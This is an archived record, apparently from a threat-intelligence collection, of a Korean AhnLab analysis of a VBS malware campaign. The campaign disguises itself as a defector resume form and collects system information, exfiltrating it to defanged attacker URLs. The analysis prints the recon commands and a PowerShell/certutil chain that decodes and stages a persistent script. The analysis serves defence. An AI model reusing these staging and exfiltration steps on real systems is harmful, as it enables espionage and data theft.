{
    "id": "a204c496-4fec-47e3-b7a9-daa466a92edb",
    "created_at": "2023-01-12T15:03:13.136916Z",
    "updated_at": "2025-03-27T02:05:57.622366Z",
    "deleted_at": null,
    "sha1_hash": "b8627a5e76b23802a468ca6bc2fa9501e99d9a8b",
    "title": "2022-03-29 - APT Attack Impersonating Defector Resume Form (VBS SCRIPT)",
    "authors": "",
    "file_creation_date": "2022-05-28T23:24:02Z",
    "file_modification_date": "2022-05-28T23:24:02Z",
    "file_size": 2038448,
    "plain_text": "# 탈북자 이력서 양식을 가장한 APT 공격 (VBS 스크립트)\n\n**asec.ahnlab.com/ko/33141/**\n\n2022년 3월 29일\n\nASEC 분석팀은 최근 대북 관련 내용의 피싱 메일을 통해 정보 유출 목적의 악성 VBS가 유포\n되고 있음을 확인하였다. 대북 관련 방송의 섭외 내용을 담고 있으며 압축 파일이 첨부되어 있\n다. 이력서 작성을 언급하여 첨부된 파일의 실행을 유도한다. 압축 파일 내부에는 악성 VBS 스\n크립트 파일이 존재한다.\n\n\n-----\n\n그림1. 유포 이메일\n\n그림2. 첨부된 압축파일\n‘2022 이력서 양식.vbs’ 파일의 간략한 행위는 다음과 같다.\n\n정보 수집 및 전송\n정상 한글 파일 생성\n추가 악성 스크립트 파일 생성 및 작업 스케줄러 등록\n\n\n-----\n\nVBS 파일 실행 시 아래의 명령어를 통해 사용자 PC의 정보를 수집한다.\n\n수집 정보 명령어\n\n현재 실행중인 프로세스 목록 cmd /c tasklist /v | clip\n\n라우팅 테이블 정보 cmd /c Route print | clip\n\nProgram Files 폴더 정보 cmd /c dir /w “”%SystemRoot%/../Program Files”” | clip\n\n\nProgram Files (x86) 폴더 정\n보\n\n\ncmd /c dir /w “”%SystemRoot%/../Program Files (x86)”” |\nclip\n\n\n표1. 수집 정보\n이후 수집한 정보를 Base64로 인코딩 한 후\nhxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php 로 전송한다.\n\n파라미터 값 : Cache=error&Sand=[User명]&Data=[base64로 인코딩된 수집 정\n보]&Em=[base64로 인코딩된 사용자명]\n\n또한, 정상 파일로 위장하기 위해 ‘2022 이력서 양식.vbs’ 파일을 실행한 폴더에 ‘2022.hwp’명\n령어로 생성된 한글 파일을 실행한다. 한글 파일은 다음과 같이 이력서 양식 내용을 담고 있다.\n\n\n-----\n\n그림3. 한글 파일 내부\n\n\n-----\n\n그림4. 한글 파일\n\n속성\n이후 정보를 전송한 URL로부터 수신한 응답에 존재하는 데이터를 파워쉘을 활용하여 실행한\n다. 또한 해당 응답을 통해 생성된 %appdata%\\mscornet.vbs 파일을 Google Update Source\nLink 명으로 작업 스케쥴러에 등록한다. 이 뿐만 아니라 시작프로그램 폴더에 mscornet.vbs를\n복사하여 VBS 파일이 자동으로 실행될 수 있도록 한 후 ‘2022 이력서 양식.vbs’ 파일을 자가\n삭제한다.\n\n그림5. 생성된 작업 스케줄러\n\n\n-----\n\n현재는 정보를 전송한 hxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php 에\n서 특별한 응답이 수신되지 않지만, 자사 자동 분석 시스템인 RAPIT에 기록되어있는 수신 응\n답(3/26 확인)에는 추가 명령어가 존재한다.\n\n해당 응답 메시지에는 파워쉘을 활용하여 base64로 인코딩 된 데이터를\n%AppData%\\~KB3241.tmp 에 저장한다. 이후 ~KB3241.tmp 를 디코딩하여\n%AppData%\\mscornet.vbs로 저장한 후 ~KB3241.tmp를 삭제한다.\n```\npowershell -w hidden ECHO OFF echo\nRnVuY3Rpb24gaDJzKGgpDQogIERpbSBhIDogYSA9IFNwbGl0KGgpDQogIERpbSBp >\n\"%AppData%\\~KB3241.tmp\" \necho DQogIEZvciBpID0gMCBUbyBVQm91bmQoYSkNCiAgICAgIGEoaSkgPSBDaHIoIiYi >>\n\"%AppData%\\~KB3241.tmp\" \n<생략>\necho ZSINCmtpbGxQcm9jZXNzICJpZWxvd3V0aWwuZXhlIg== >> \"%AppData%\\~KB3241.tmp\" \ncertutil -f -decode \"%AppData%\\~KB3241.tmp\" \"%AppData%\\mscornet.vbs\" \ndel \"%AppData%\\~KB3241.tmp\"\n\n```\nmscornet.vbs는 hxxp://cmaildowninvoice.webcindario[.]com/contri/sqlite/msgbugGlog.php?\nCache=fail&Sand=[PC명] 에 접속하여 받아온 응답을 Execute 명령어로 실행한다. 현재 해당\nURL에서 추가 명령어는 확인되지 않지만, 공격자에 의해 다양한 악성 행위를 수행할 수 있다.\n\n최근 대북 관련 내용으로 위장한 악성코드가 워드 문서 뿐만 아니라 VBS 스크립트 형태로도\n유포되고 있어 사용자의 주의가 요구된다.\n\n현재 안랩 V3 제품은 해당 파일에 대해 다음과 같이 진단하고있다.\n\n**[파일** 진단]\nDropper/VBS.Generic\nTrojan/VBS.Agent\n\n**[IOC]**\nab97956fec732676ecfcedf55efadcbc\ne49e41a810730f4bf3d43178e4c84ee5\nhxxp://fserverone.webcindario[.]com/contri/sqlite/msgbugPlog.php\nhxxp://cmaildowninvoice.webcindario[.]com/contri/sqlite/ msgbugGlog.php\n\n연관 IOC 및 관련 상세 분석 정보는 안랩의 차세대 위협 인텔리전스 플랫폼 ‘AhnLab TIP’ 구\n독 서비스를 통해 확인 가능하다.\n\n\n-----\n\n[Categories:악성코드](https://asec.ahnlab.com/ko/category/malware/) 정보\n\n[Tagged as:VBScript](https://asec.ahnlab.com/ko/tag/vbscript/)\n\n\n-----",
    "language": "KO",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-29 - APT Attack Impersonating Defector Resume Form (VBS SCRIPT).pdf"
    ],
    "report_names": [
        "2022-03-29 - APT Attack Impersonating Defector Resume Form (VBS SCRIPT).pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535793,
    "ts_updated_at": 1743041157,
    "ts_creation_date": 1653780242,
    "ts_modification_date": 1653780242,
    "files": {
        "pdf": "https://archive.orkl.eu/b8627a5e76b23802a468ca6bc2fa9501e99d9a8b.pdf",
        "text": "https://archive.orkl.eu/b8627a5e76b23802a468ca6bc2fa9501e99d9a8b.txt",
        "img": "https://archive.orkl.eu/b8627a5e76b23802a468ca6bc2fa9501e99d9a8b.jpg"
    }
}